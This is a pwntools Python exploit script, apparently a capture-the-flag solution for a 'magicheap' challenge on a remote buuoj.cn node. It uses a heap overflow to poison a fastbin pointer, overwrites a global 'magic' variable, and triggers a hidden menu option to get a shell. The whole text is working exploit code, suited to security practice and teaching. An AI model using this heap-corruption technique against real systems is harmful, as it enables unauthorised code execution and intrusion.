from pwn import *

#p = process('./magicheap')
p = remote('node4.buuoj.cn', 29960)

def alloc(size, content):
	p.sendlineafter(b'Your choice :', b'1')
	p.sendlineafter(b'Size of Heap : ', str(size).encode())
	p.sendafter(b'Content of heap:', content)
	
def edit(index, size, content):
	p.sendlineafter(b'Your choice :', b'2')
	p.sendlineafter(b'Index :', str(index).encode())
	p.sendlineafter(b'Size of Heap : ', str(size).encode())
	p.sendafter(b'Content of heap : ', content)

def delete(index):
	p.sendlineafter(b'Your choice :', b'3')
	p.sendlineafter(b'Index :', str(index).encode())

magic = 0x6020A0
fake_heap = magic - 0x13

alloc(0x60, b'a')
alloc(0x60, b'a')
alloc(0x60, b'a')

delete(1)

edit(0, 0x78, b'a' * ( 0x60 + 8 ) + p64(0x71) + p64(fake_heap))

alloc(0x60, b'a')
alloc(0x60, b'a' * (0x6020a0 - 0x60209d) + p64(0x1306))
#gdb.attach(p, 'source ~/libc/loadsym.py;loadsym ~/libc/2.23/64/libc-2.23.debug.so')
p.sendlineafter(b'Your choice :', b'4869')
p.interactive()
